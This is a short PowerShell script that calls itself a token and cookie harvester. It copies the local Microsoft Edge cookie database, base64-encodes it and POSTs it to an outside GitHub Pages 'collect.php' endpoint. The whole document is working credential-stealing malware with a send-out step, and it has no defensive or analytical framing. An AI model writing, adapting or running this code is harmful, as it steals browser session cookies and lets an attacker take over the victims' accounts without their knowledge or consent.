# Token and cookie harvester for local browsers
# Exfiltrates to your GitHub Pages endpoint

$edgeCookies = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Default\Cookies"
if (Test-Path $edgeCookies) {
    $copyPath = Join-Path $env:TEMP "edge_cookies.db"
    Copy-Item -Path $edgeCookies -Destination $copyPath -Force
    $uri = "https://personfu.github.io/CyberWorld_login/collect.php"
    $bytes = [System.IO.File]::ReadAllBytes($copyPath)
    $enc = [Convert]::ToBase64String($bytes)
    $body = @{file=$enc; filename="edge_cookies.db"}
    Invoke-WebRequest -Uri $uri -Method POST -Body $body -UseBasicParsing
}
